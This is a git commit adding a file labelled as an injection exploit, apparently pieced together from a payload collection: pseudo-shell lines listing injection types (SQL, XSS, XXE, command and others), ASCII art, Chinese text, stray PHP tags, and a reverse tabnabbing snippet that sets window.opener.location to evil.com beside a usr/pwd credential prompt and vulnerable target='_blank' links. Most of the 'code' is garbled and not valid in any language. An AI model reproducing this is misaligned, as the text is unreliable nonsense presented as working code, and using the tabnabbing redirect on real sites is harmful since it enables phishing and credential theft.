cdc269f81aee95ec9924b03fc23fb1ad1d2658d2
Z4 <30985576+TheProdigyLeague@users.noreply.github.com>
2023-04-03 22:05:43 -0500

    -upd --pkg --re --mod

---
+++ attc_from_proxy/xploit-inj-vuln_imp.py
@@ -0,0 +1,51 @@
+$ --mod -force --1njectionS
+>>>import 1njectionS
+$ run index.js@--github/include-fragment-element/d...
+$clipboarditem.js@--github/browser-support/lib/token
+$ --git clone https://github_remote-modules/assets/manifest.json
+$--git clone https://github.com/TheProdigyLeague/Jwt_aws/blob/hash-cracking/CSV%20Injection/dat.bat
+>>>on \swissky@xCSV Injection/dat.bat
+>>>on \swissky@xSQL Injection/evil.bat
+>>>on \swissky@xPATH Injection/dir.bash
+>>>on \swissky@xAWS/BucketS3_injection.js
+>>>on \swissky@xXSS Injection.py
+>>>on \swissky@xXXE Injection.py
+>>>on \swissky@xCRLF Injection.py
+>>>on \swissky@xSAML Injection.py
+>>>on \swissky@xXSLT Injection.py
+>>>on \swissky@xNoSQL Injection.py
+>>>on \swissky@xCMD Injection.py
+>>>on \swissky@xGraphQL Injection.py
+>>>on \swissky@XlatEX Injection.py
+>>>on \swissky@Cross-Origin Injection/misconfig.c
+>>>on \swissky@/README.md -list --upd
+$ ls
+去猎犬！机器使用！
+<pre class="">          ,
+         _o_
+    ._ ,'   `o'
+----(_)      :       ^aNT
+    '  `.   .o
+         ~o~  `
+          '
+</pre>
+之内。投影。
+>>>from -link ["TARGET","PAGE"] -write Permissions for xxx.com ["END","USESR"] if the -usr --auth -new -page --cred ["SEND", "XXX"] --xchange
+<?php
+- [Discover Reverse Tabnabbing - Burp Extension](https://portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30)
+>>>from -attc for Search_Link ["INSERT"] xxx.com/ctrl --docker ["POST"] function(check) -link -rel -attr --docker Value 'noopener' ["TARGET"] -attr --docker -value "__blank" if ["CASE"] xxx.com --vuln 
+/!\
+>>>from -attc ["POST"] -xxx.com/ctrl --docker --inj --vuln --xploit code.js 
+  { window.opener.location = "http://evil.com" } ["CLICK"] -usr --new --open --tab while code.js sys.exe }; 
+  [!]back::ground::tab 
+<redirecting... 
+if { -usr -re --open }; ["OPEN"]
+usr:
+pwd:
+$ curl
+?>
+<a href="..." target="_blank" rel="" />  
+or
+<a href="..." target="_blank" />
+- [Reverse Tabnabbing - OWASP, 20.10.20](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
+- [Tabnabbing - Wikipedia, 20.10.20](https://en.wikipedia.org/wiki/Tabnabbing)
